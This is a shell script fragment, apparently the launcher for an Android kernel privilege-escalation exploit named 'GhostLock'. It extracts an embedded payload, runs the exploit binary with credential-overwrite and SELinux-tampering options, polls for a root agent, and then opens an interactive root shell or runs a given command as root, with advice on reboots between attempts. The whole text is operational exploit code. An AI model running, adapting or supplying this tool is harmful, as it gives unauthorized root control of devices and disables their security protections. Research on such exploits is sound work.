__GL_PAYLOAD__
tar -xzf "$DIR/payload.tar.gz" -C "$DIR" || {
  echo "[!] payload extraction failed"; exit 6; }
rm -f "$DIR/payload.tar.gz"
chmod 755 "$DIR"/* 2>/dev/null

if [ "$MODE" = "extract" ]; then
  echo "[ok] payload extracted to $DIR"
  exit 0
fi

echo "[*] running GhostLock (one attempt per boot; this takes ~30-60s)"
env -i \
  PATH=/sbin:/system/sbin:/system/bin:/system/xbin:/vendor/bin \
  TMPDIR=/data/local/tmp \
  GHOST_DIRECT_BROKER="$DIR/kirkwood_root_agent" \
  GHOST_BROKER_UID=0 \
  GHOST_BROKER_ABSTRACT="$ABS" \
  GHOST_SELINUX=1 \
  GHOST_SELINUX_PRESERVE_INIT=0 \
  TCL_PERF_WITNESS=1 \
  TCL_PERF_WITNESS_ATTEMPTS=5 \
  TCL_PERF_RING_LOOPS="$LOOPS" \
  TCL_PERF_WITNESS_MIN_HITS=3 \
  TCL_MCAST_HELPER="$DIR/tcl-v643-mcast-helper" \
  TCL_SPLIT_SETTLE_US="$SETTLE" \
  FOPS_MAX_ATTEMPTS=1 \
  CRED_ATTEMPTS=1 \
  KSNITCH_VERBOSE=0 \
  "$DIR/ghostlock-lab" --cred > "$DIR/gl.log" 2>&1
rc=$?
echo "[i] exploit finished (rc=$rc)"
tail -n 200 "$DIR/gl.log" 2>/dev/null

READY=""
i=0
while [ "$i" -lt 150 ]; do
  if [ -f /data/local/tmp/root_agent_ready ]; then
    READY="$(cat /data/local/tmp/root_agent_ready 2>/dev/null)"
    case "$READY" in
      *"abstract=$ABS"*) break ;;
    esac
    READY=""
  fi
  i=$((i + 1))
  sleep 0.2 2>/dev/null || sleep 1
done
case "$READY" in
  *"abstract=$ABS"*) ;;
  *)
    echo "[!] root agent did not start."
    if grep -q 'W2 PASS' "$DIR/gl.log" 2>/dev/null; then
      echo "[!] W1+W2 landed but the agent was not reached; reboot now."
    elif grep -q 'W1 PASS' "$DIR/gl.log" 2>/dev/null; then
      echo "[!] W1 landed but W2 failed: SELinux is permissive and there is no root."
      echo "    Reboot now (do NOT retry on this boot):"
      echo "      adb reboot    # or shub-ctrl power off/on"
    else
      echo "    SELinux is unchanged; you may try once more on this boot."
    fi
    exit 7 ;;
esac

echo "[+] ROOT AGENT READY: $READY"
case "$MODE" in
  none)
    echo "[i] root session kept alive; reconnect within ~30 min with:"
    echo "    $DIR/kirkwood_root_sh --name $ABS"
    exit 0 ;;
  exec)
    exec "$DIR/kirkwood_root_sh" --name "$ABS" --exec "$CMD" ;;
  *)
    if [ ! -t 0 ]; then
      echo "[i] stdin is not a tty; root agent stays alive for ~30 min."
      echo "    reconnect: $DIR/kirkwood_root_sh --name $ABS"
      exit 0
    fi
    echo "[i] entering interactive root shell (exit to leave)"
    "$DIR/kirkwood_root_sh" --name "$ABS"
    rc=$?
    echo "[i] left root shell; root agent stays alive until reboot (TTL ~30 min)."
    exit "$rc" ;;
esac
